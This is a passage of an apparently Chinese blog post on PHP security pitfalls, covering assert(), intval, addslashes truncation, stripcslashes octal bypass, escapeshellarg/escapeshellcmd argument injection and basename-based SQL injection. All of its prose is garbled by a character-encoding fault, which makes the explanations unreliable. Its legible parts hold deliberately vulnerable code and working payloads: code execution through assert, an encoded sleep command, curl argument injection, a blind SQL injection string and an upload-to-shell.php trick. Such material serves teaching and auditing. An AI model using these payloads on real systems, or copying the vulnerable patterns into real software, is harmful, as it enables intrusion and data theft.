ä»»ç„¶å¯ä»¥æ‰§è¡Œã€‚å¦‚æœåé¢å­˜åœ¨å±é™©å‡½æ•°ï¼Œé‚£ä¹ˆå°†ä¼šè§¦å‘æ¼æ´ã€‚</p><p>ä¾‹å¦‚ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">extract($_POST);</span><br><span class="line"></span><br><span class="line">function goAway() &#123;</span><br><span class="line">    error_log(&quot;Hacking attempt.&quot;);</span><br><span class="line">    header(&apos;Location: /error/&apos;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if (!isset($pi) || !is_numeric($pi)) &#123;</span><br><span class="line">    goAway();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if (!assert(&quot;(int)$pi == 3&quot;)) &#123;</span><br><span class="line">    echo &quot;This is not pi.&quot;;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    echo &quot;This might be pi.&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ­¤å¤„å°±å¯ä»¥POSTä¸€ä¸ª<code>pi=phpinfo()</code>æ¥å€ŸåŠ©assert()å‡½æ•°è§¦å‘ä»£ç æ‰§è¡Œæ¼æ´</p><h4 id="19-intval"><a href="#19-intval" class="headerlink" title="19.intval"></a>19.intval</h4><p>ç‰¹æ€§1:</p><p>intval()å‡½æ•°æ‰§è¡ŒæˆåŠŸæ—¶è¿”å› å˜é‡çš„10è¿›åˆ¶å€¼ï¼Œå¤±è´¥æ—¶è¿”å› 0ã€‚ç©ºçš„ array è¿”å› 0ï¼Œéç©ºçš„ array è¿”å› 1ã€‚</p><p>ç‰¹æ€§2:</p><p>æ•´æ•°æº¢å‡ºã€å‘ä¸‹å–æ•´å’Œæ•´å½¢åˆ¤æ–­å­˜åœ¨é—®é¢˜</p><p>(1)æ•´æ•°æº¢å‡º</p><p>32ä½ç³»ç»Ÿæœ€å¤§çš„å¸¦ç¬¦å·èŒƒå›´ä¸º-2147483648 åˆ° 2147483647ï¼Œ64ä½æœ€å¤§çš„æ˜¯ 9223372036854775807ã€‚å› æ­¤ï¼Œåœ¨32ä½ç³»ç»Ÿä¸Š intval(â€˜1000000000000â€™) ä¼šè¿”å› 2147483647</p><p>(2)å‘ä¸‹å–æ•´</p><p>intval(10.99999)ä¼šè¿”å›10ï¼Œintvalå’Œintç­‰å–æ•´éƒ½æ˜¯â€™æˆªæ–­â€™å–æ•´ï¼Œå¹¶ä¸æ˜¯å››èˆäº”å…¥</p><p>(3)intvalå‡½æ•°è¿›å»å–æ•´æ—¶ï¼Œæ˜¯ç›´åˆ°é‡ä¸Šæ•°å­—æˆ–è€…æ­£è´Ÿå·æ‰å¼€å§‹è¿›è¡Œè½¬æ¢ï¼Œä¹‹ååœ¨é‡åˆ°éæ•°å­—æˆ–è€…ç»“æŸç¬¦å·ï¼ˆ\0ï¼‰æ—¶ç»“æŸè½¬æ¢</p><p>ç‰¹æ€§3:</p><p>intval()å‡½æ•°ä¼šå¿½ç•¥â€™â€™ â€˜\nâ€™ã€â€™\râ€™ã€â€™\tâ€™ã€â€™\vâ€™ã€â€™\0â€™ ï¼Œä¹Ÿå°±æ˜¯è¯´intval(â€œ\r\n\t 12â€) &gt;&gt; 12</p><h4 id="20-htmlentities"><a href="#20-htmlentities" class="headerlink" title="20.htmlentities"></a>20.htmlentities</h4><p>htmlentitiesé»˜è®¤æƒ…å†µä¸‹ä¸ä¼šå¯¹å•å¼•å·è¿›è¡Œè½¬ä¹‰ã€‚</p><h4 id="21-addslashes"><a href="#21-addslashes" class="headerlink" title="21.addslashes"></a>21.addslashes</h4><p>åœ¨è¿›è¡Œäº†addslashesä¹‹åè¿›è¡Œäº†æˆªæ–­ï¼Œåœ¨ä¸€äº›æƒ…å†µä¸‹å°±æœ‰å¯èƒ½èƒ½å¤Ÿè·å¾—ä¸€ä¸ªå¼•å·ã€‚</p><p>æ¯”å¦‚ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">function sanitizeInput($input, $length = 20) &#123;</span><br><span class="line">    $input = addslashes($input);</span><br><span class="line">    if (strlen($input) &gt; $length) &#123;</span><br><span class="line">        $input = substr($input, 0, $length);</span><br><span class="line">    &#125;</span><br><span class="line">    return $input;</span><br><span class="line">&#125;</span><br><span class="line">$test = &quot;1234567890123456789&apos;&quot;;</span><br><span class="line">var_dump(sanitizeInput($test));</span><br><span class="line"></span><br><span class="line">//output:1234567890123456789\</span><br></pre></td></tr></table></figure><p>æ­¤å¤„è¾“å‡ºçš„åˆšå¥½æ˜¯å¸¦æœ‰ä¸€ä¸ª\ï¼Œè€Œâ€™åˆ™å› ä¸ºé•¿åº¦é™åˆ¶è¢«æˆªæ–­ï¼Œä»è€Œå¯ä»¥å‡ºå‘SQLæ³¨å…¥æ¼æ´</p><h4 id="22-å°ç‰¹æ€§"><a href="#22-å°ç‰¹æ€§" class="headerlink" title="22.å°ç‰¹æ€§"></a>22.å°ç‰¹æ€§</h4><p>(1)phpè‡ªèº«åœ¨è§£æè¯·æ±‚çš„æ—¶å€™ï¼Œå¦‚æœå‚æ•°åå­—ä¸­åŒ…å«ç©ºæ ¼ã€.ã€[è¿™å‡ ä¸ªå­—ç¬¦ï¼Œä¼šå°†ä»–ä»¬è½¬æ¢æˆ_ã€‚ä½†æ˜¯é€šè¿‡<code>$_SERVER[&#39;REQUEST_URI&#39;]</code>æ–¹å¼è·å¾—çš„å‚æ•°å¹¶ä¸ä¼šè¿›è¡Œè½¬æ¢ã€‚</p><p>(2)$_REQUESTæ˜¯ç›´æ¥ä»GETï¼ŒPOST å’Œ COOKIEä¸­å–å€¼ï¼Œä¸æ˜¯ä»–ä»¬çš„å¼•ç”¨ã€‚å³ä½¿åç»­GETï¼ŒPOST å’Œ COOKIEå‘ç”Ÿäº†å˜åŒ–ï¼Œä¹Ÿä¸ä¼šå½±å“$_REQUESTçš„ç»“æœ</p><p>å‚è€ƒï¼š</p><p><a href="https://blog.spoock.com/2018/05/05/request-vuln-analysis/" target="_blank" rel="noopener">ã€Šrequestå¯¼è‡´çš„å®‰å…¨æ€§é—®é¢˜åˆ†æã€‹</a></p><p><a href="https://blog.csdn.net/u011721501/article/details/51824576" target="_blank" rel="noopener">ã€ŠPHPçš„ä¸¤ä¸ªç‰¹æ€§å¯¼è‡´wafç»•è¿‡æ³¨å…¥ã€‹</a></p><p>(3)PHPä¸­çš„<code>&quot;&quot;</code>æ˜¯å¯ä»¥æ‰§è¡Œä»£ç çš„ï¼Œå› è€Œåœ¨payloadä¸­å¸¸é‡‡ç”¨<code>&quot;&lt;?php phpinfo();&gt;&quot;</code></p><h4 id="23"><a href="#23" class="headerlink" title="23. ++"></a>23. ++</h4><p>PHPä¸­çš„è‡ªå¢ç¬¦å·++åœ¨å¦‚ä¸‹æƒ…å†µä¸­ä¸ä¼šæœ‰ä»»ä½•æ„ä¹‰</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$test=123; echo $test++;  # 123</span><br></pre></td></tr></table></figure><p>å› æ­¤åƒä¸‹é¢ä»£ç æ‰€ç¤ºçš„ä¸€æ ·ï¼Œå°±å¯èƒ½å›äº§ç”Ÿå˜é‡è¦†ç›–æ¼æ´</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">foreach ($input as $field =&gt; $count) &#123;</span><br><span class="line">    $this-&gt;$field = $count++;</span><br><span class="line">&#125;</span><br><span class="line">//è¿™é‡Œçš„$count++åœ¨æ­¤å¹¶æ²¡æœ‰ç«‹å³å¯¹å€¼è¿›è¡Œäº†ä¿®æ”¹</span><br></pre></td></tr></table></figure><p>æç¤ºï¼šå½“ç„¶å¦‚æœ++$countå½¢å¼çš„è¯ï¼Œä¹Ÿæ˜¯å¯ä»¥å­˜åœ¨å˜é‡è¦†ç›–çš„ï¼Œå› ä¸ºåœ¨è¿›è¡Œ++æ“ä½œæ—¶ä¼šè¿›è¡Œéšå¼ç±»å‹è½¬æ¢ï¼Œå¦‚æœèƒ½å¤Ÿè½¬æ¢æˆåŠŸï¼Œåˆ™ä¼šè¿›è¡ŒåŠ æ³•æ“ä½œï¼›å¦‚æœä¸èƒ½è½¬æ¢æˆåŠŸï¼Œåˆ™å°†æœ€åä¸€ä¸ªå­—ç¬¦è¿›è¡ŒåŠ æ³•æ“ä½œã€‚</p><p>ç¤ºä¾‹ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$test = 123; echo ++$test;      // 124</span><br><span class="line">$test = &apos;123&apos;; echo ++$test;    // 124</span><br><span class="line">$test = &apos;1ab&apos;; echo ++$test;    // &apos;1ac&apos;</span><br><span class="line">$test = &apos;ab1&apos;; echo ++$test;    // &apos;ab2&apos;</span><br><span class="line">$test = &apos;a1b&apos;; echo ++$test;    // &apos;a1c&apos;</span><br><span class="line">$test =array(2,&apos;name&apos;=&gt;&apos;wyj&apos;); echo ++$test;    //Array123</span><br><span class="line"></span><br><span class="line">//æ‰€ä»¥æˆ‘ä»¬æ„é€ shell.php4æˆ–è€…shell.phoè¿™æ ·çš„ï¼Œåœ¨è‡ªå¢æ“ä½œåå°±ä¼šå˜æˆæˆ‘ä»¬æƒ³è¦çš„shell.php5æˆ–è€…shell.php</span><br></pre></td></tr></table></figure><h4 id="24-openssl-verify"><a href="#24-openssl-verify" class="headerlink" title="24.openssl_verify"></a>24.openssl_verify</h4><p>ä¾æ®openssl_verify()çš„å®šä¹‰æœ‰</p><blockquote><p>å¦‚æœç­¾åæ­£ç¡®è¿”å› 1, ç­¾åé”™è¯¯è¿”å› 0, å†…éƒ¨å‘ç”Ÿé”™è¯¯åˆ™è¿”å›-1.</p></blockquote><p>å¦‚æœå•ç‹¬é‡‡ç”¨å¦‚ä¸‹å½¢å¼çš„åˆ¤æ–­å°±ä¼šå‡ºç°é—®é¢˜ï¼Œå› ä¸ºifåˆ¤æ–­åªæœ‰é‡åˆ°0æˆ–è€…æ˜¯falseè¿”å›çš„æ‰æ˜¯falseã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">if (openssl_verify($data, $signature, $pub)) &#123;</span><br><span class="line">    $object = json_decode(base64_decode($data));</span><br><span class="line">    $this-&gt;loginAsUser($object);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="25-stripcslashes"><a href="#25-stripcslashes" class="headerlink" title="25.stripcslashes"></a>25.stripcslashes</h4><p>stripcslasheså‡½æ•°</p><blockquote><p>è¿”å›åè½¬ä¹‰åçš„å­—ç¬¦ä¸²ã€‚å¯è¯†åˆ«ç±»ä¼¼ C è¯­è¨€çš„ \nï¼Œ\rï¼Œâ€¦ å…«è¿›åˆ¶ä»¥åŠåå…­è¿›åˆ¶çš„æè¿°ã€‚</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var_dump(stripcslashes(&apos;0\073\163\154\145\145\160\0405\073&apos;));      // 0;sleep 5;</span><br></pre></td></tr></table></figure><p>å› è€Œå¯¹äºä¸‹é¢è¿™ç§å½¢å¼æˆ‘ä»¬å¯ä»¥é‡‡ç”¨å°†å‘½ä»¤è½¬æ¢ä¸ºå…«è¿›åˆ¶çš„å½¢å¼è¿›è¡Œç»•è¿‡æ­£åˆ™åˆ¤æ–­å¹¶è§¦å‘å‘½ä»¤æ‰§è¡Œ</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">function createThumbnail() &#123;</span><br><span class="line">    $e = stripcslashes(</span><br><span class="line">        preg_replace(</span><br><span class="line">            &apos;/[^0-9\\\]/&apos;,</span><br><span class="line">            &apos;&apos;,</span><br><span class="line">            isset($_GET[&apos;size&apos;]) ? $_GET[&apos;size&apos;] : &apos;25&apos;</span><br><span class="line">        )</span><br><span class="line">    );</span><br><span class="line">    system(&quot;/usr/bin/convert &#123;$this-&gt;file&#125; --resize $e</span><br><span class="line">            ./thumbs/&#123;$this-&gt;file&#125;&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="26-set-error-handler"><a href="#26-set-error-handler" class="headerlink" title="26.set_error_handler"></a>26.set_error_handler</h4><p>è‹¥é”™è¯¯é…ç½®æ­¤å‡½æ•°ï¼Œå°†ä¼šé€ æˆä¿¡æ¯æ³„éœ²è¿›è€Œé€ æˆæ¼æ´äº§ç”Ÿï¼Œæ¯”å¦‚ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">set_error_handler(function ($no, $str, $file, $line) &#123;</span><br><span class="line">    throw new ErrorException($str, 0, $no, $file, $line);</span><br><span class="line">&#125;, E_ALL);</span><br></pre></td></tr></table></figure><p>è¿™é‡Œçš„è®¾ç½®å°±ç›¸å½“äº</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">error_reporting(E_ALL);</span><br><span class="line">ini_set(&apos;display_errors&apos;, TRUE);</span><br><span class="line">ini_set(&apos;display_startup_errors&apos;, TRUE);</span><br></pre></td></tr></table></figure><p>è¿™ç§é…ç½®å°†ä¼šæ³„éœ²æ‰€æœ‰çš„é”™è¯¯ä¿¡æ¯</p><h4 id="27-declareä¸array-walk"><a href="#27-declareä¸array-walk" class="headerlink" title="27.declareä¸array_walk"></a>27.declareä¸array_walk</h4><p>é’ˆå¯¹PHP7ç‰ˆæœ¬</p><p>PHP7ä¸­å¼•å…¥äº†declare(strict_types=1);è¿™ç§å£°æ˜æ–¹å¼ï¼Œåœ¨è¿›è¡Œå‡½æ•°è°ƒç”¨çš„æ—¶å€™ä¼šè¿›è¡Œå‚æ•°ç±»å‹æ£€æŸ¥ã€‚å¦‚æœå‚æ•°ç±»å‹ä¸åŒ¹é…åˆ™å‡½æ•°ä¸ä¼šè¢«è°ƒç”¨ã€‚<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">declare(strict_types=1);</span><br><span class="line">function addnum(int $a,int $b) &#123;</span><br><span class="line">    return $a+$b;</span><br><span class="line">&#125;</span><br><span class="line">$result = addnum(1,2);</span><br><span class="line">var_dump($result);              // è¾“å‡º3</span><br><span class="line">$result = addnum(&apos;1&apos;,&apos;2&apos;);</span><br><span class="line">var_dump($result);              //å‡ºç°Fatal error: Uncaught TypeErrorï¼ŒArgument 1 passed to addnum() must be of the type integer, string given,ç¨‹åºå‡ºé”™ï¼Œå‚æ•°çš„æ•°æ®ç±»å‹ä¸åŒ¹é…</span><br></pre></td></tr></table></figure></p><p>ä½†æ˜¯é€šè¿‡array_walk()è°ƒç”¨çš„å‡½æ•°ä¼šå¿½ç•¥æ‰ä¸¥æ ¼æ¨¡å¼è¿˜æ˜¯æŒ‰ç…§ä¹‹å‰çš„phpçš„ç±»å‹è½¬æ¢çš„æ–¹å¼è°ƒç”¨å‡½æ•°ã€‚<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">declare(strict_types=1);</span><br><span class="line">function addnum(int &amp;$value) &#123;</span><br><span class="line">    $value = $value+1;</span><br><span class="line">&#125;</span><br><span class="line">$input = array(&apos;3a&apos;,&apos;4b&apos;);</span><br><span class="line">array_walk($input,addnum);</span><br><span class="line">var_dump($input);//array(4,5)</span><br></pre></td></tr></table></figure></p><p>å› æ­¤åˆ©ç”¨array_walk()çš„è¿™ç§ç‰¹æ€§ï¼Œæˆ‘ä»¬å¯ä»¥ä¼ å…¥ä»»æ„å­—ç¬¦è¿›å»ï¼Œè¿›è€Œè§¦å‘ç›¸åº”çš„æ¼æ´ã€‚</p><h4 id="28-ldap-escape"><a href="#28-ldap-escape" class="headerlink" title="28.ldap_escape"></a>28.ldap_escape</h4><blockquote><p><strong>string ldap_escape ( string $value [, string $ignore [, int $flags ]] )</strong></p><p><strong>value</strong></p><p>The value to escape.</p><p><strong>ignore</strong></p><p>Characters to ignore when escaping.</p><p><strong>flags</strong></p><p>The context the escaped string will be used in: LDAP_ESCAPE_FILTER for filters to be used with ldap_search(), or LDAP_ESCAPE_DN for DNs.</p></blockquote><p>å½“ä½¿ç”¨ldap_search()æ—¶éœ€è¦é€‰æ‹©LDAP_ESCAPE_FILTERè¿‡æ»¤å­—ç¬¦ä¸²ï¼Œä½†æ˜¯å¦‚æœé€‰æ‹©LDAP_ESCAPE_DNå°†ä¼šå¯¼è‡´è¿‡æ»¤æ— æ•ˆ</p><h4 id="29-strip-tags-amp-amp-preg-replace"><a href="#29-strip-tags-amp-amp-preg-replace" class="headerlink" title="29.strip_tags &amp;&amp; preg_replace"></a>29.strip_tags &amp;&amp; preg_replace</h4><p>ä¾‹å¦‚:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$textMsg = trim(strip_tags(preg_replace(&apos;/&lt;(head|title|style|script)[^&gt;]*&gt;.*?&lt;\/\\1&gt;/s&apos;ï¼Œ&apos;&apos;ï¼Œ$message)));</span><br></pre></td></tr></table></figure><p>ç›®çš„å¾ˆæ˜æ˜¾â€“å»æ‰æ‰€æœ‰çš„æ ‡ç­¾å’Œå†…å®¹ã€‚é¦–å…ˆä½¿ç”¨<code>preg_replace</code>è¿‡æ»¤æ‰æ ‡ç­¾ã€æ ‡ç­¾å†…å®¹ã€æ ‡ç­¾å±æ€§ï¼Œæ¥ç€åˆä½¿<code>ç”¨strip_tags</code>å»æ‰å…¶ä½™çš„htmlå’Œphpæ ‡è®°ã€‚</p><p>æ­£å¸¸è¾“å…¥æ²¡é—®é¢˜â€“å¦‚:<code>&lt;head&gt;evil&lt;/head&gt;</code>ï¼Œå¾—åˆ°çš„ç»“æœæ˜¯ç©ºï¼Œå³å…¨éƒ¨éƒ½è¢«è¿‡æ»¤äº†ã€‚</p><p>ç»“æœå¾ˆæ‚²æƒ¨â€“å¦‚æœæ”»å‡»è€…è¾“å…¥<code>&lt;head&gt;evil&lt;/headend&gt;</code>æˆ–è€…<code>&lt;he&lt;&gt;ad&gt;evil&lt;/head&gt;</code>ä¹‹ç±»ï¼Œå°±ä¼šå¯¼è‡´evilå­—ç¬¦ä¸²é€ƒé€¸ï¼Œæ”»å‡»è€…åˆ©ç”¨evilå­—ç¬¦ä¸²å†ç»“åˆä¸Šä¸‹æ–‡è¯´ä¸å®šå°±èƒ½å¤Ÿé€ æˆæ¼æ´ã€‚</p><h4 id="30-escapeshellarg-amp-amp-escapeshellcmd"><a href="#30-escapeshellarg-amp-amp-escapeshellcmd" class="headerlink" title="30.escapeshellarg &amp;&amp; escapeshellcmd"></a>30.escapeshellarg &amp;&amp; escapeshellcmd</h4><blockquote><p>escapeshellarg å°†ç»™å­—ç¬¦ä¸²å¢åŠ ä¸€ä¸ªå•å¼•å·å¹¶ä¸”èƒ½å¼•ç”¨æˆ–è€…è½¬ç ä»»ä½•å·²ç»å­˜åœ¨çš„å•å¼•å·</p></blockquote><blockquote><p>escapeshellcmd ä¼šå¯¹&amp;#;|*?~&lt;&gt;^()[]{}$\ï¼Œ \x0A å’Œ \xFFè¿›è¡Œè½¬ä¹‰ï¼Œâ€™å’Œ â€œä»…åœ¨ä¸é…å¯¹å„¿çš„æ—¶å€™è¢«è½¬ä¹‰</p></blockquote><p>éœ€è¦æ³¨æ„çš„æ˜¯escapeshellargå’Œescapeshellcmdåœ¨winå¹³å°å’Œlinuxå¹³å°çš„è¡¨ç°æ˜¯ä¸ä¸€æ ·çš„ã€‚ä»–ä»¬ä¸¤è€…é€ æˆçš„æ¼æ´ä¹Ÿä¸»è¦æ˜¯åœ¨Linuxå¹³å°ä¸‹ã€‚æ¥ä¸‹æ¥ä¸»è¦æ˜¯è¯´æ˜åœ¨Linuxå¹³å°ä¸‹çš„æƒ…å†µ</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$msg = &quot;123&apos;456&quot;;</span><br><span class="line">echo escapeshellarg($msg)  // ç»“æœæ˜¯ï¼š &apos;123&apos;\&apos;&apos;456&apos;</span><br><span class="line">echo escapeshellcmd($msg)  // ç»“æœæ˜¯: 123\&apos;456</span><br></pre></td></tr></table></figure><p>å½“ä¸¤è€…æ··åˆä½¿ç”¨æ—¶ï¼Œå°±ä¼šå‡ºç°é—®é¢˜ã€‚ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$parameter1 = escapeshellarg($parameter)</span><br><span class="line">$parameter2 = escapeshellcmd($parameter1)</span><br><span class="line">system(&quot;curl &quot;.$parameter2)</span><br></pre></td></tr></table></figure><p>å‡è®¾æˆ‘ä»¬ä¼ å…¥çš„$parameterä¸º<code>172.17.0.2&#39; -v -d a=1</code>ï¼Œé‚£ä¹ˆç»è¿‡escapeshellargä¹‹åå˜ä¸º<code>&#39;172.17.0.2&#39;\&#39;&#39; -v -d a=1&#39;</code>ã€‚ä¹‹åç»è¿‡escapeshellcmdå˜ä¸º<code>&#39;172.17.0.2&#39;\\&#39;&#39; -v -d a=1\&#39;</code>ï¼Œæ­¤æ—¶\çš„å­˜åœ¨åé¢å¾—â€™ä¸ä¼šè¢«è½¬ä¹‰ï¼Œæ‰€ä»¥åé¢çš„ä¸¤ä¸ªâ€™â€™å˜ä¸ºäº†ç©ºç™½å­—ç¬¦ã€‚é‚£ä¹ˆæœ€åå®é™…çš„å‘½ä»¤ä¸º<code>curl 172.17.0.2\ -v -d a=1&#39;</code>ï¼ŒæˆåŠŸåœ°é€ƒé€¸äº†å•å¼•å·ã€‚</p><p>è¿™ä¸¤ä¸ªå‡½æ•°è”åˆä½¿ç”¨ä¹‹åå¯ä»¥é€ æˆå•å¼•å·é€ƒé€¸ï¼Œè¿™æ ·å°±å¾ˆæœ‰å¯èƒ½ä¼šé€ æˆæ¼æ´ï¼Œåˆ©ç”¨çš„æ–¹å¼å°±éœ€è¦çœ‹å…·ä½“çš„åº”ç”¨åœºæ™¯äº†ã€‚</p><h4 id="31-addslashes-amp-amp-basename"><a href="#31-addslashes-amp-amp-basename" class="headerlink" title="31.addslashes &amp;&amp; basename"></a>31.addslashes &amp;&amp; basename</h4><p>basenameçš„ä¸»è¦ç”¨æ³•æ˜¯ï¼š</p><blockquote><p>ç»™å‡ºä¸€ä¸ªåŒ…å«æœ‰æŒ‡å‘ä¸€ä¸ªæ–‡ä»¶çš„å…¨è·¯å¾„çš„å­—ç¬¦ä¸²ï¼Œbasename()å‡½æ•°è¿”å›åŸºæœ¬çš„æ–‡ä»¶åã€‚å¦‚æœæ˜¯åœ¨windowsç¯å¢ƒä¸‹ï¼Œè·¯å¾„ä¸­çš„æ–œçº¿(/)å’Œåæ–œçº¿()éƒ½å¯ä»¥ç”¨ä½œç›®å½•åˆ†å‰²ç¬¦ï¼Œåœ¨å…¶ä»–ç¯å¢ƒä¸‹æ˜¯æ–œçº¿(/)</p></blockquote><p>ç¤ºä¾‹:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">åœ¨ winå¹³å°ä¸‹</span><br><span class="line">$mypath1 = &apos;C:/Users/monkey/1.txt&apos;;</span><br><span class="line">$name1 = basename($mypath1);</span><br><span class="line">var_dump($name1);       // 1.txt</span><br><span class="line">$mypath2 = &apos;C:\Users\monkey\2.txt&apos;;</span><br><span class="line">$name2 = basename($mypath2);</span><br><span class="line">var_dump($name2);       // 2.txt</span><br><span class="line"></span><br><span class="line">åœ¨Linuxå¹³å°ä¸‹</span><br><span class="line">$mypath1 = &apos;C:/Users/monkey/1.txt&apos;;</span><br><span class="line">$name1 = basename($mypath1);</span><br><span class="line">var_dump($name1);       // 1.txt</span><br><span class="line">$mypath2 = &apos;C:\Users\monkey\2.txt&apos;;</span><br><span class="line">$name2 = basename($mypath2);</span><br><span class="line">var_dump($name2);       // C:\Users\monkey\2.txt</span><br></pre></td></tr></table></figure></p><p>æ³¨:</p><ol><li>ä¸ä¸€å®šæ˜¯éœ€è¦addslashesï¼Œåªéœ€è¦æ˜¯è¿›è¡Œäº†è½¬ä¹‰å³å¯</li><li>æ­¤æ–¹å¼çš„åˆ©ç”¨éœ€è¦åœ¨winå¹³å°ä¸‹ã€‚å› ä¸ºåœ¨winå¹³å°ä¸‹ï¼Œ\/éƒ½å¯ä»¥ä½œä¸ºbasenameçš„åˆ†éš”ç¬¦ï¼Œä½†æ˜¯åœ¨Linuxå¹³å°ä¸‹åªæœ‰/å¯ä»¥ä½œä¸ºåˆ†éš”ç¬¦ï¼Œè€Œaddslashesä¼šå¢åŠ ä¸€ä¸ª\ã€‚æ‰€ä»¥åªèƒ½åœ¨winå¹³å°ä¸‹ä½¿ç”¨ã€‚</li></ol><p>æ¼æ´æ¼”ç¤ºå¦‚ä¸‹ï¼š<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$filename = &quot;123&apos;456.png&quot;;</span><br><span class="line">$filename = addslashes($filename);</span><br><span class="line">var_dump($filename);        //ç»“æœæ˜¯ 123\&apos;456.png</span><br><span class="line">$filename = basename($filename);</span><br><span class="line">var_dump($filename);        // ç»“æœæ˜¯ &apos;456.png</span><br></pre></td></tr></table></figure></p><p>é€šè¿‡ä¾‹å­å¯ä»¥çœ‹åˆ°ï¼ŒæˆåŠŸåœ°é€ƒé€¸äº†åæ–œçº¿ï¼Œå•å¼•å·ä¹Ÿä¿ç•™äº†ã€‚<br>å¦‚æœå­˜åœ¨å¦‚ä¸‹çš„ä»£ç :</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">// å¯¹è¾“å…¥è¿›è¡Œè½¬ä¹‰</span><br><span class="line">if (!@ get_magic_quotes_gpc()) &#123;</span><br><span class="line">    $_GET = $_GET ? $this-&gt;addslashes_deep($_GET) : &apos;&apos;;</span><br><span class="line">    $_POST = $_POST ? $this-&gt;addslashes_deep($_POST) : &apos;&apos;;</span><br><span class="line">    $_COOKIE = $this-&gt;addslashes_deep($_COOKIE);</span><br><span class="line">    $_REQUEST = $this-&gt;addslashes_deep($_REQUEST);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$imagename = basename($_POST[&apos;image&apos;]);</span><br><span class="line">$sql = &quot;UPDATE table SET image = &apos;&quot;.$imagename.&quot;&apos;where id=1&quot;;</span><br><span class="line">query($sql);</span><br></pre></td></tr></table></figure><p>æ­¤æ—¶ï¼Œå¦‚æœæˆ‘ä»¬è¾“å…¥çš„imageçš„å‚æ•°ä¸º<code>123&#39; and if(1.sleep(3)ï¼Œ0)#</code>ï¼Œæœ€åçš„imagenameçš„å€¼ä¸º<code>&#39; and if(1.sleep(3)ï¼Œ0)#</code>ï¼Œsqlè¯­å¥ä¸º<code>UPDATE table SET image = &#39;&#39; or if(1.sleep(3)ï¼Œ0)#&#39;where id=1</code>å½¢æˆäº†ä¸€ä¸ªç›²æ³¨ã€‚</p><h4 id="32-explode-amp-amp-preg-replace"><a href="#32-explode-amp-amp-preg-replace" class="headerlink" title="32.explode &amp;&amp; preg_replace"></a>32.explode 